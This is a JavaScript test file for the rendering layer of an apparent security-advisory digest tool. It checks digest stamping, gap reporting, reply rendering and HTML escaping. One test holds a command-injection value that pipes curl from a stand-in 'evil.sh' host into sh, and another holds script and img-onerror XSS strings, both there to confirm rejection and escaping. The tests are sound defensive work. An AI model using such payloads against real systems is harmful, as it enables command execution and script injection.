/**
 * Rendering.
 *
 * Three claims are tested, and each one is a promise the design makes to the
 * reader:
 *
 *   - the digest is stamped with the **observation time**, never the schedule;
 *   - a failed source is **rendered**, not omitted;
 *   - a reply to `explain` is **marked unverified**, permanently and visibly.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  MARKER_BEGIN,
  MARKER_END,
  buildFacts,
  attachDecisions,
  renderDigest,
  renderReadmeSection,
  renderSummary,
  renderReply,
  renderError,
  replaceBetweenMarkers,
  diffEvents,
  markdownToHtml,
} from '../lib/render.mjs';

const payload = (over = {}) => ({
  observed_at: '2026-01-01T06:12:00.000Z',
  packages: [{ name: 'lodash', ecosystem: 'npm', pinned: '4.17.15' }],
  advisories: [{ id: 'GHSA-35jh-r3h4-6jhm', package: 'lodash' }],
  releases: [{ slug: 'nodejs/node', tag: 'v22.0.0', published_at: '2025-12-31T00:00:00.000Z', url: 'https://example.invalid/release' }],
  feeds: [],
  errors: [],
  ...over,
});

const decisions = [
  { advisory_id: 'GHSA-35jh-r3h4-6jhm', package: 'lodash', pinned: '4.17.15', upgrade: '4.17.21', decision: 'act', reason: 'affected, and we import merge', severity: 7.4, layer: 'rules' },
  { advisory_id: 'GHSA-aaaa-bbbb-cccc', package: 'express', pinned: '4.18.2', upgrade: null, decision: 'uncertain', reason: 'usage is unmapped', severity: null, layer: 'rules' },
];

/* --------------------------------------------------------------- digest --- */

test('the digest is stamped with the observation time, not the schedule', () => {
  const md = renderDigest({ payload: payload(), decisions });
  assert.match(md, /As of 2026-01-01T06:12:00\.000Z/);
  assert.doesNotMatch(md, /today's briefing/i);
});

test('the digest groups by decision and carries the reason', () => {
  const md = renderDigest({ payload: payload(), decisions });
  assert.match(md, /## Act on these/);
  assert.match(md, /## Needs your call/);
  assert.match(md, /GHSA-35jh-r3h4-6jhm/);
  assert.match(md, /affected, and we import merge/);
});

test('narration sits on top of the deterministic digest, it does not replace it', () => {
  const md = renderDigest({ payload: payload(), decisions, narration: 'Three things moved.' });
  assert.match(md, /Three things moved\./);
  assert.match(md, /## Act on these/, 'the table is still there');
});

test('a failed source is rendered, not hidden', () => {
  const md = renderDigest({ payload: payload({ errors: [{ source: 'osv', error: 'HTTP 503' }] }), decisions });
  assert.match(md, /## Gaps in this run/);
  assert.match(md, /HTTP 503/);
});

test('a narration that was configured and failed is rendered, not hidden', () => {
  // The defect this closes, found by pointing the pipeline at a live endpoint
  // that refused it. `narrate-step` catches the error and exits 0 so the run is
  // not failed over a missing paragraph — correct — but nothing recorded *why*
  // the paragraph was missing. So the digest, the README, the run record and the
  // heartbeat all read exactly as they would on an instance that was never given
  // a model key. A wrong key was indistinguishable from a deliberate no-key
  // configuration, indefinitely, on a daily cron nobody reads.
  const md = renderDigest({
    payload: payload(),
    decisions,
    narrationStatus: { configured: true, ok: false, kind: 'http', status: 401 },
  });
  assert.match(md, /## Gaps in this run/, 'the gap section must appear even with no source errors');
  assert.match(md, /`narration`/);
  assert.match(md, /HTTP 401/, 'the status is the diagnosis');
  assert.match(md, /deterministic one/, 'and the reader is told the digest above is still complete');
});

test('an unconfigured narration is not a gap, and an empty errors list alone is not one either', () => {
  // The other half of the distinction. A keyless instance is a supported mode,
  // not a degradation — it must not grow a warning just for being keyless.
  const keyless = renderDigest({
    payload: payload(),
    decisions,
    narrationStatus: { configured: false, ok: false, kind: 'not-configured', status: null },
  });
  assert.doesNotMatch(keyless, /## Gaps in this run/);

  const absent = renderDigest({ payload: payload(), decisions });
  assert.doesNotMatch(absent, /## Gaps in this run/, 'no record at all is also not a gap');
});

test('every narration failure kind says something specific, and none quotes the endpoint', () => {
  const kinds = [
    { kind: 'http', status: 401, expect: /HTTP 401/ },
    { kind: 'timeout', status: null, expect: /did not answer in time/ },
    { kind: 'budget', status: null, expect: /LLM_TOKEN_BUDGET/ },
    { kind: 'network', status: null, expect: /could not be reached/ },
    // Found live: a 200 whose content was empty. It must be a visible gap, not a
    // silent absence — the whole point of the narration record.
    { kind: 'truncated', status: null, expect: /ran out of tokens before it wrote anything/ },
    { kind: 'empty', status: null, expect: /answered with no text/ },
    { kind: 'nothing-to-narrate', status: null, expect: /nothing to narrate/ },
  ];
  for (const c of kinds) {
    const md = renderDigest({
      payload: payload(),
      decisions,
      narrationStatus: { configured: true, ok: false, kind: c.kind, status: c.status },
    });
    assert.match(md, c.expect, `${c.kind} must be described specifically`);
  }

  // The endpoint's own body is never reproduced: it is not ours, and this file
  // is committed to a repository that may be public.
  const md = renderDigest({
    payload: payload(),
    decisions,
    narrationStatus: { configured: true, ok: false, kind: 'http', status: 401, error: 'unauthorized client detected, contact support' },
  });
  assert.doesNotMatch(md, /unauthorized client detected/);
});

test('severity renders as the score or the word the source published', () => {
  const md = renderDigest({
    payload: payload(),
    decisions: [
      { advisory_id: 'GHSA-aaaa-bbbb-cccc', package: 'lodash', decision: 'act', reason: 'r', severity: 7.4 },
      { advisory_id: 'GHSA-dddd-eeee-ffff', package: 'lodash', decision: 'act', reason: 'r', severity: null, severity_label: 'CRITICAL' },
      { advisory_id: 'GHSA-1111-2222-3333', package: 'lodash', decision: 'act', reason: 'r' },
    ],
  });
  assert.match(md, /\| 7\.4 \|/);
  assert.match(md, /\| CRITICAL \|/);
  assert.match(md, /\| — \| r \|/, 'nothing published renders as an em dash, never as a guess');
});

test('an empty decision set still renders a complete digest', () => {
  const md = renderDigest({ payload: payload(), decisions: [] });
  assert.match(md, /0 to act on/);
  assert.match(md, /Upstream releases/);
});

/* --------------------------------------------------------------- README --- */

test('markers are appended when absent and replaced in place when present', () => {
  const fresh = replaceBetweenMarkers('# Title\n', 'section one');
  assert.ok(fresh.includes(MARKER_BEGIN) && fresh.includes(MARKER_END));
  assert.match(fresh, /section one/);

  const replaced = replaceBetweenMarkers(fresh, 'section two');
  assert.match(replaced, /section two/);
  assert.doesNotMatch(replaced, /section one/);
  assert.match(replaced, /^# Title/);
});

test('the README region says what needs a decision, and admits a gap', () => {
  const clean = renderReadmeSection({ payload: payload(), decisions: [], heartbeat: null });
  assert.match(clean, /Nothing needs a decision today\./);

  const busy = renderReadmeSection({ payload: payload({ errors: [{ source: 'osv', error: 'x' }] }), decisions, heartbeat: null });
  assert.match(busy, /1 to act on/);
  assert.match(busy, /1 source\(s\) did not answer/);
});

test('the summary carries the scalars a badge needs, and the liveness signal', () => {
  const s = renderSummary({
    payload: payload(),
    decisions,
    heartbeat: { last_run_at: '2026-01-01T06:12:00.000Z', last_status: 'ok' },
  });
  assert.equal(s.advisories, 2);
  assert.equal(s.actionable, 1);
  assert.equal(s.uncertain, 1);
  assert.equal(s.packages, 1);
  assert.equal(s.sources_failed, 0);
  assert.equal(s.last_status, 'ok');
});

/* --------------------------------------------------------------- events --- */

test('events are transitions, not snapshots', () => {
  const before = [
    { advisory_id: 'A', package: 'lodash', decision: 'watch', pinned: '1.0.0' },
    { advisory_id: 'B', package: 'express', decision: 'act', pinned: '2.0.0' },
  ];
  const after = [
    { advisory_id: 'A', package: 'lodash', decision: 'act', pinned: '1.0.1' },
    { advisory_id: 'C', package: 'react', decision: 'watch', pinned: '18.0.0' },
  ];
  const events = diffEvents(before, after, { observed_at: '2026-01-01T00:00:00.000Z' });
  const kinds = events.map((e) => `${e.kind}:${e.advisory_id}`).sort();
  assert.deepEqual(kinds, ['bumped:A', 'cleared:B', 'flagged:C', 'reclassified:A']);
  assert.equal(events.find((e) => e.kind === 'reclassified').from, 'watch');
  assert.equal(events.find((e) => e.kind === 'reclassified').to, 'act');
});

test('an unchanged set produces no events, so the clock ticking is not history', () => {
  const same = [{ advisory_id: 'A', package: 'lodash', decision: 'act', pinned: '1.0.0' }];
  assert.deepEqual(diffEvents(same, same, { observed_at: '2026-01-01T00:00:00.000Z' }), []);
});

/* -------------------------------------------------------------- replies --- */

test('why renders the stored decision, and says so when there is none', () => {
  const md = renderReply({ verb: 'why', arg: { name: 'lodash' }, decisions });
  assert.match(md, /GHSA-35jh-r3h4-6jhm/);
  assert.match(md, /decision `act`/);

  const none = renderReply({ verb: 'why', arg: { name: 'react' }, decisions });
  assert.match(none, /No stored decision/);
});

test('what-changed renders transitions', () => {
  const md = renderReply({
    verb: 'what-changed',
    arg: null,
    events: [{ kind: 'reclassified', advisory_id: 'A', from: 'watch', to: 'act' }],
  });
  assert.match(md, /A.*reclassified watch → act/);
});

test('an explain answer without a model says so instead of inventing one', () => {
  const md = renderReply({ verb: 'explain', arg: 'GHSA-35jh-r3h4-6jhm', decisions, modelAnswer: null });
  assert.match(md, /No model endpoint configured/);
});

test('an explain answer with a model is marked unverified, permanently', () => {
  const md = renderReply({ verb: 'explain', arg: 'GHSA-35jh-r3h4-6jhm', decisions, modelAnswer: 'It matters because…' });
  assert.match(md, /This answer is not verified/);
  assert.match(md, /not covered by the containment gate/);
  assert.match(md, /It matters because…/);
});

test('pause and resume are one-line state acknowledgements', () => {
  assert.match(renderReply({ verb: 'pause', arg: null }), /Paused/);
  assert.match(renderReply({ verb: 'resume', arg: null }), /Resumed/);
});

test('errors render a fixed message without echoing the body back', () => {
  const body = '"; curl evil.sh | sh';
  const md = renderError({ code: 'unsafe-arg', message: body });
  assert.doesNotMatch(md, /curl/, 'the rejected body is never reflected');
  assert.match(md, /characters outside the allowed set/);
  assert.match(renderError({ code: 'unauthorised' }), /owners, members and collaborators/);
  assert.match(renderError({ code: 'something-new' }), /Command rejected/);
});

/* ------------------------------------------------------------ markdown --- */

test('markdown renders the subset the digest emits', () => {
  const html = markdownToHtml('# Title\n\n## Section\n\n| A | B |\n|---|---|\n| 1 | 2 |\n\n- one\n- two\n\n`code` and **bold**\n\n---\n');
  assert.match(html, /<h1>Title<\/h1>/);
  assert.match(html, /<h2>Section<\/h2>/);
  assert.match(html, /<table><thead><tr><th>A<\/th><th>B<\/th>/);
  assert.match(html, /<td>1<\/td>/);
  assert.match(html, /<ul>\n<li>one<\/li>\n<li>two<\/li>\n<\/ul>/);
  assert.match(html, /<code>code<\/code>/);
  assert.match(html, /<strong>bold<\/strong>/);
  assert.match(html, /<hr>/);
});

test('upstream text is escaped before it reaches the page', () => {
  const html = markdownToHtml('## <script>alert(1)</script>\n\nAn advisory titled <img src=x onerror=alert(1)>.');
  assert.doesNotMatch(html, /<script>/);
  assert.doesNotMatch(html, /<img/);
  assert.match(html, /&lt;script&gt;/);
});

test('a link keeps its href and is marked nofollow', () => {
  const html = markdownToHtml('- see [the advisory](https://example.invalid/a)');
  assert.match(html, /href="https:\/\/example\.invalid\/a"/);
  assert.match(html, /rel="noopener noreferrer nofollow"/);
});

/* ---------------------------------------------------------------- facts --- */

test('the fact list is the only permitted source for the narrator', () => {
  // `buildFacts` takes the payload with the decisions folded in — one document,
  // the same one the gate reads. It no longer takes `decisions` as a second
  // argument, so it cannot read a document the gate is not given.
  const facts = buildFacts(
    attachDecisions(payload({ errors: [{ source: 'osv', error: 'HTTP 503' }] }), decisions),
  );
  const joined = facts.join('\n');
  assert.match(joined, /GHSA-35jh-r3h4-6jhm affects lodash pinned at 4\.17\.15; fixed in 4\.17\.21/);
  assert.match(joined, /source unavailable: osv/);
  assert.match(joined, /nodejs\/node released v22\.0\.0/);
  assert.match(joined, /observed at 2026-01-01T06:12:00\.000Z/);
});
